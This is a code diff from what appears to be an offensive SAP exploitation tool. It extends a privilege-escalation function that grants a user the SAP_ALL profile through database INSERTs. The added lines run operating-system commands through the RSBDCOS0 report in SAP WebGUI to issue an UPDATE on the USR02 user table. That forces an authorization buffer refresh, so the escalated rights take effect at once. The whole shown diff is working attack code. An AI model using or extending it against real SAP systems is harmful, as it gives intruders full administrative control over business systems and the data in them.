@@ -392,9 +392,28 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
     if executed == 0:
         return False
 
+    # Force SAP to invalidate the authorization buffer for this user.
+    # Updating USR02 (e.g. setting UFLAG=0, which is a no-op for an
+    # already unlocked user) triggers the ABAP kernel to re-read the
+    # authorization tables on the next logon.
+    username_uc = creds.username.upper()
+    buf_sql = (f"UPDATE USR02 SET UFLAG=0 "
+               f"WHERE MANDT='{creds.client}' AND BNAME='{username_uc}'")
+    buf_cmd = _build_os_command_for_sql(buf_sql, db_type, sid, inst_nr)
+    if buf_cmd:
+        print(f"[*] Triggering user buffer refresh via USR02 update...")
+        moin, resp, ti = _webgui_okcode(
+            session, post_url, moin,
+            "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
+        )
+        if "Execute OS Command" in str(ti) + resp:
+            moin, resp, ti = _webgui_batch(session, post_url, moin, [
+                {"post": f"value/{field_sid}", "content": buf_cmd},
+                {"post": "vkey/0/ses[0]"},
+                {"get": "state/ur"},
+            ])
+
     print(f"[+] SAP_ALL assigned to {creds.username} via database INSERTs")
-    print(f"[!] Note: User {creds.username} may need to re-logon for the")
-    print(f"    new authorizations to take effect (user buffer refresh).")
     return True
 
 
